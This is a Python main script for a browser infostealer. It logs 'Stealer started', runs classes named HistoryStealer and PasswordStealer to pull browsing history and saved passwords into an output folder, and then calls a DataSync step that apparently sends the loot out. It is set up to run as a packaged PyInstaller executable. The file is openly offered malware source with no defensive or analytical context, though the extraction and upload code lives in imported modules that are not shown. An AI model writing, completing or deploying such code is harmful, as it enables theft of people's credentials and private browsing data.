import os
import sys
import logging
import socket
from datetime import datetime

# Import modules
import browser_log
import browser_passwords
import data_sync

def main():
    # Setup paths
    if getattr(sys, 'frozen', False):
        # Running as PyInstaller exe
        BASE_DIR = os.path.dirname(sys.executable)
    else:
        # Running as script
        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    
    OUTPUT_DIR = os.path.join(BASE_DIR, "output")
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # Logging
    log_file = os.path.join(OUTPUT_DIR, "stealer_execution.log")
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s",
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()
        ]
    )
    
    logging.info("="*50)
    logging.info(f"Stealer started on {socket.gethostname()}")
    logging.info("="*50)

    # 1. Browsing History
    try:
        logging.info("Starting Browsing History Extraction...")
        history_stealer = browser_log.HistoryStealer(OUTPUT_DIR)
        history_stealer.run()
        logging.info("Browsing History Extraction Finished.")
    except Exception as e:
        logging.error(f"Browsing History Failed: {e}")

    # 2. Passwords
    try:
        logging.info("Starting Password Extraction...")
        stealer = browser_passwords.PasswordStealer(OUTPUT_DIR)
        stealer.run()
        logging.info("Password Extraction Finished.")
    except Exception as e:
        logging.error(f"Password Extraction Failed: {e}")

    # 3. Data Sync
    try:
        syncer = data_sync.DataSync(OUTPUT_DIR)
        syncer.start_sync()
    except Exception as e:
        print(f"[-] Sync exception: {e}")

    # 4. Finished
    logging.info("All tasks completed.")
    print("\n[+] Exiting...")

if __name__ == "__main__":
    main()
